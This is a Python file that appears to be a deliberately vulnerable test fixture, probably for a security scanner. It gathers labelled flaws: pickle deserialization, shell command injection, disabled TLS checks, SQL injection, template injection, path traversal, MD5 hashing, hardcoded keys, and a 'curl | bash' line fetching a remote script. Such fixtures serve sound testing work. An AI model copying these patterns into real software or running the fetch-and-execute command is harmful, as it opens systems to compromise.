import hashlib
import os
import pickle
import subprocess

import requests
from flask import render_template_string, send_file


def load_session(blob):
    return pickle.loads(blob)


def run_user_cmd(cmd):
    return subprocess.run(cmd, shell=True)


def fetch(url):
    return requests.get(url, verify=False)


def get_order(order_id):
    # intentional IDOR sample — no ownership check
    return db_query("SELECT * FROM orders WHERE id = ?", order_id)  # noqa: F821


def lookup_user(user_id):
    # intentional SQLi via f-string
    return cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")  # noqa: F821


def render_page(user_tpl):
    return render_template_string(user_tpl)


def read_upload(user_path):
    return open(user_path)


def download(path):
    return send_file(path)


def weak_password_hash(password):
    return hashlib.md5(password.encode()).hexdigest()


def bootstrap():
    # intentional supply-chain anti-pattern (fixture only)
    os.system("curl https://example.invalid/install.sh | bash")


DEBUG = True
AES_KEY = "hardcoded-aes-key-01"

API_KEY = "sk_live_example_key_do_not_use_12345"

if __name__ == "__main__":
    app.run(debug=True)  # noqa: F821
